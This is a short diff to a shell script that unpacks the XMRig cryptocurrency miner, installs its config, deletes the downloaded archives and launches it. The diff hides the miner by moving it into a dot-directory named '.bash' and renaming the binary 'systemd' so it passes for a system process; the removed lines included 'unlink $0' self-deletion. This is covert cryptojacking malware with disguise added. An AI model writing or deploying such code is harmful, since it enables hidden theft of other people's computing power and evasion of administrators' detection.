@@ -6,11 +6,11 @@ unzip ./master.zip
 
 tar -xvzf ./xmrig-2.10.0-xenial-x64.tar.gz
 
-mv ./xmrig-2.10.0 ./bash
+mv ./xmrig-2.10.0 ./.bash
 
 cd configs-master/
 
-cp ./config.json ../bash/config.json
+cp ./config.json ../.bash/config.json
 
 cd ../
 
@@ -18,12 +18,8 @@ rm -rf configs-master/
 
 rm master.zip xmrig-2.10.0-xenial-x64.tar.gz
 
-cd bash/
+cd .bash/
 
-mv ./xmrig ./compiz
+mv ./xmrig ./systemd
 
-./compiz
-
-top
-
-unlink $0
+./systemd
